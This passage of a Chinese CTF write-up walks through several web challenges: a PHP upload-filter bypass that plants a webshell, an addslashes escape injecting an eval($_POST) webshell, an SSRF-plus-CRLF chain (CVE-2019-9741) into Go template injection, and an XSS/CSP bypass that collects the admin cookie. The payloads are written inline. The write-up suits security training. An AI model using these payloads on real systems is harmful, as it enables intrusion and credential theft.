1.  但是这样会有hacker的提示,可以看到源码中,对上传文件的内容进行了检测,对于此我们可以采用\<script\>这种标胶进行绕过(因为实验环境是在php
    5.6下进行的)

![](http://yanxuan.nosdn.127.net/3d37cab358d3495523219222163444fc.png)

![](http://yanxuan.nosdn.127.net/53b0437f7c516287160e73fa8289b45d.png)

1.  可以看到已经绕过了\<?标记检测

![](http://yanxuan.nosdn.127.net/5cc1c0db821efed5a3bdd0b30b6d0b2c.png)

1.  这里又会遇到一个问题就是我们不能让他保存为php的后缀,

![](http://yanxuan.nosdn.127.net/e05495d883c6e87a73d88c0e0499503a.png)

1.  所以回到源码中发现他以数组的形式(这一句话\$file_name = reset(\$file) . '.' .
    \$file[count(\$file) -
    1];)进行判断,且最后以move_uploaded_file函数进行上传.我们应该知道这个函数会递归删除文件最后的/.字符串(例如1.php/.会被转化为1.php,而且是递归的),所以我们的思路就清楚了因为file_name
    等于reset(\$file)加一个. 和\$file[count(\$file) -
    1]组成的,所以我们让reset(\$file)为xxx.php/,再让\$file[count(\$file) -
    1]为空,这样我们的文件名就能组成为xxx.php/.最后会删除/.所以就能保存为php格式了

2.  再bp中按照这样输入,就可以发现上传成功了

![](http://yanxuan.nosdn.127.net/e35684563dcd45008c8ad3e038648670.png)

1.  然后访问上传的文件就可以

![](http://yanxuan.nosdn.127.net/74d8e0555c3f248eca19f035dd9e045c.png)

1.  使用木马,post请求即可得到flag

![](http://yanxuan.nosdn.127.net/21eeedb930ee600d3580ba60c23a2655.png)

### simple_web
#### 原理知识
1）	Php的webshell的基础知识,就是eval函数将得到的字符串当作了命令处理了
2）	简单的命令注入

#### 解题过程
步骤：

1.  打开靶机，出现这样一个页面

![](http://yanxuan.nosdn.127.net/d609e8d5a74caa891a03ff0037a7192a.png)

1.  根据提示后,考虑存在robots.txt文件

2.  访问robots.txt出现一下内容

![](http://yanxuan.nosdn.127.net/e7e43a985f21e9d686f11a222249980d.png)

1.  继续访问getsandbox.php,得到一下内容.

![](http://yanxuan.nosdn.127.net/40c510805dc806888cd634ae3bf8fe95.png)

1.  了解大意后,发现是一个得到了一个沙盒,然后发送get请求reset=1就能重置沙盒

2.  接着访问属于自己的沙盒,发现如下代码

![](http://yanxuan.nosdn.127.net/4e1b909538460ceaf5dff17e9a351928.png)

1.  审计之后,发现会写入一个content.php的文件内,但是我们输入的字符都会被addslashes添加转义,从而保证安全

2.  规则大概如下‘-\>/’,/-\>//,所以我们需要采用特别的构造技巧,payload如下:?content=aaa\\';\@eval(\$_POST[x]);;//

3.  如此构造后我们content.php的内容就会变为如下的内容

![](http://yanxuan.nosdn.127.net/35dc985ff4fc828e29016450648a571c.png)

10 .使用菜刀链接,从而就在根目录下能得到flag

![](http://yanxuan.nosdn.127.net/774cab26538b4686933bc3ce842c53fb.png)

### smile doge
#### 原理知识
1） CRLF 注入漏洞， 是因为 Web 应用没有对用户输入做严格验证， 导致攻击者可以输入一些恶意字符。 攻击者一旦
向请求行或首部中的字段注入恶意的 CRLF， 就能注入一些首部字段或报文主体， 并在响应中输出， 所以又称为
HTTP 响应拆分漏洞（HTTP Response Splitting） 。
2） SSTI 和常见 Web 注入(SQL 注入等)的成因一样， 也是服务端接收了用户的输入， 将其作为 Web 应用模板内容的
一部分， 在进行目标编译渲染的过程中， 执行了用户插入的恶意内容。

#### 解题过程
1） 打开浏览器， 访问目标主机， 可以看到页面只有一个输入框， 简单测试可以看到输入的内容基本都原样输出了，
且默认页面输出为“Hello gugugu!” ， 输入“http://127.0.0.1” 后发现输出的内容为“Hello Hello gugugu!!” 
可以看到内容发生了嵌套， 说明可能存在 SSRF

![](http://yanxuan.nosdn.127.net/cc1ace6f4d5ec7ea66a91c7455b19f19.png)

2） 页面提示代号 9527， 于是输入“http://127.0.0.1:9527/” ， 发现同样出现了内容嵌套， 且内容为“Hello
No.9527!” ， 可以判断出内网中 9527 端口存在一个服务

![](http://yanxuan.nosdn.127.net/fef5753d1da79aa274c70bf65f1e7ec7.png)

3） 用 Dirsearch 等工具能够很轻易地扫到备份文件： http://127.0.0.1/backup/.index.php.swp

![](http://yanxuan.nosdn.127.net/7b86a352659767c273bf3e07c9ec9764.png)

下载下来用 vim -r .index.php.swp 恢复源码

![](http://yanxuan.nosdn.127.net/d1fdefe3378a4fb5742f5b50d0c5ad4d.png)

4） 稍微搜一下能发现代码是 Golang 的， 首先可以看出 flag 是放在*http.Request 的 Header 中的， 结合 9527 端口
的回显是“Hello No.9527!” ， 可以得出 name 参数的值即为输出的值， 当请求的 Header 中含有“Logic” 头时， name
的值即为“Logic” 头的值， 但是 SSRF 在一般情况下是无法控制服务器发出请求中的 Header 的， 此时就要考虑如何
控制 SSRF 中的 Header， 即 CRLF 注入， 这里实际用的是 CVE-2019-9741。 构造 Payload： “http://127.0.0.1:9527/?
HTTP/1.1\r\nLogic: abc”

![](http://yanxuan.nosdn.127.net/5a59766a4321470e016a42d2d043b7f4.png)

5） 在 Go 的模板中， 要插入一个对象的值， 则使用`{{.对象名}}`， 回忆之前的源码泄露， flag 是放在*http.Request
中的， 在结构体中可以看到*http.Request 的名为 MyRequest， 所以模板注入的 Payload 为`{{.MyRequest}}`， 完整的
Payload：
`“http://127.0.0.1:9527/? HTTP/1.1\r\nLogic: {{.MyRequest}}”`

![](http://yanxuan.nosdn.127.net/35cbfb06af62c56decd53663b5d62180.png)

### superwaf
#### 原理知识
1）	XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。
#### 解题过程
1.  打开浏览器，访问目标主机，可以看到界面如下图1所示：

![](http://yanxuan.nosdn.127.net/61cb53a02f78c5d8aa91951a6e7ee9e1.png)

图1 web界面

1.  每次提交payload需要提交MD5校验码，编写脚本爆破，脚本如下图2所示：

![](http://yanxuan.nosdn.127.net/46afeb91b02e6efd7cb918e951462f10.png)

图2 爆破脚本

1.  绕过waf的思路是bypass xss/csp \<frameset onpageshow =
    ，扫描下目录容易发现Admin
    dir的路径为/admin/admin.php，使用exp脚本生成的payload如下图3所示，具体细节部分在exp文件夹下的exp.py文件中：

![](http://yanxuan.nosdn.127.net/4486c437819d27bd6df4dae1e73b182f.png)

图3 生成payload

1.  最后在vps上获取到admin的cookie，也就是flag，如下图4所示，或者也可以使用xss平台。

![](http://yanxuan.nosdn.127.net/e77ddcd80fd39fe8f91249fba9144556.png)

图4 获取admin cookie

# 评论区